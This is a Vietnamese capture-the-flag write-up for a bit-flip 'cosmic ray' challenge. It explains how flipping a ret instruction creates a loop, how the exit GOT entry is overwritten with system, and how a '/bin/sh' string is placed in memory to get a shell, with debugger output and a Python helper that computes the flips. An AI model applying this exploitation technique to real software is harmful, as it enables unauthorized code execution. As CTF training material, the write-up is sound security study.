# write up cosmic
- với bài này sẽ lật bit ở bất kỳ dữ liệu nào của các địa chỉ trong vùng nhớ xong từ đó ghi lại vào memory map
- vì thế ta có thể lật bit của intruction ở return sao cho nó không return về chỗ mà chương trình bình thường return 
```assembly
pwndbg> x/10xi 0x00000000004015aa
   0x4015aa <cosmic_ray+476>:	ret
   0x4015ab <main>:	endbr64
   0x4015af <main+4>:	push   rbp
   0x4015b0 <main+5>:	mov    rbp,rsp
=> 0x4015b3 <main+8>:	mov    rax,QWORD PTR [rip+0x2a66]        # 0x404020 <stdout@GLIBC_2.2.5>
   0x4015ba <main+15>:	mov    esi,0x0
   0x4015bf <main+20>:	mov    rdi,rax
   0x4015c2 <main+23>:	call   0x401110 <setbuf@plt>
   0x4015c7 <main+28>:	mov    rax,QWORD PTR [rip+0x2a72]        # 0x404040 <stderr@GLIBC_2.2.5>
   0x4015ce <main+35>:	mov    esi,0x0
pwndbg> 
```
- vì bài có hàm cosmic_ray nằm trên hàm main trong vùng nhớ nên ta có thể ghi return sao cho nó không run return, vì thế nó sẽ tiến thẳng tới main
- vì bài chỉ lật được 1 lần duy nhất với 1 vị trí nên phải tìm đúng chỗ 
```assembly
pwndbg> x/10xi 0x00000000004015aa
=> 0x4015aa <cosmic_ray+476>:	shl    ebx,cl
   0x4015ac <main+1>:	nop    edx
   0x4015af <main+4>:	push   rbp
```
- sau khi lật xong thì chương trình quay về main và tiến vào cosmic_ray thành 1 vòng lặp vô hạn có thể lật bất kỳ chỗ nào
- sau đó có thể ghi vào got exit để chương trình thành system 
- vì offset giống nhau nên vị trí lật các bit cũng giống nhau luôn 
- đã test nhiều lần trên aslr và tính đúng cho quy luật này vẫn đảm bảo ✔️
 ```c
[0x403fe0] __isoc99_scanf@GLIBC_2.7 -> 0x7f7f36862090 (__isoc99_scanf) ◂— endbr64 
[0x403fe8] exit@GLIBC_2.2.5 -> 0x7f7f36850d70 (system) ◂— endbr64 
[0x403ff0] __libc_start_main@GLIBC_2.34 -> 0x7f7f36829dc0 (__libc_start_main) ◂— endbr64 
[0x403ff8] __gmon_start__ -> 0
```
- tiếp theo là cần có chuỗi /bin/sh\0
- vì instruction ở trên hàm exit trong hàm cosmic ray chỉ có thể chứa được 4bytes để mov sang edi, nên tiếp theo cần ghi chuỗi kia vào vùng nhớ có địa chỉ chỉ có kích thước 4bytes
```assembly
   0x0000000000401523 <+341>:	mov    edi,0x1
   0x0000000000401528 <+346>:	call   0x401180 <exit@plt>
```
- em viết 1 quả hàm để overwrite đễ hơn bằng cách so từng bit 
- num1 là instruction ban đầu
- num2 là instruction lúc sau khi thay đổi
```c
def change(num1,num2,addr):
    listchange = []
    for i in range(8):
        byte1 = num1 >> (i*8) & 0xff
        byte2 = num2 >> (i*8) & 0xff
        binstr1 = bin(byte1)[2:].zfill(8)
        binstr2 = bin(byte2)[2:].zfill(8)
        for j in range(8):
            if(binstr1[j] != binstr2[j]):
                listchange.append(j)
                sla(b"through:",hex(addr+i).encode())
                sla(b"to flip:",str(j).encode())   
    return listchange
```
- chạy script lấy shell
```assembly
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x9e bytes:
    b'__pycache__  cosmic-ray-v3.zip\tcosmicrayv3e\t   libc-2.35.so\n'
    b'a.py\t     cosmicray.md\tcosmicrayv3e.bndb  libc.so.6\n'
    b'break\t     cosmicrayv3\tld-2.35.so\t   solve.py\n'
__pycache__  cosmic-ray-v3.zip    cosmicrayv3e       libc-2.35.so
a.py         cosmicray.md    cosmicrayv3e.bndb  libc.so.6
break         cosmicrayv3    ld-2.35.so       solve.py
$  
```
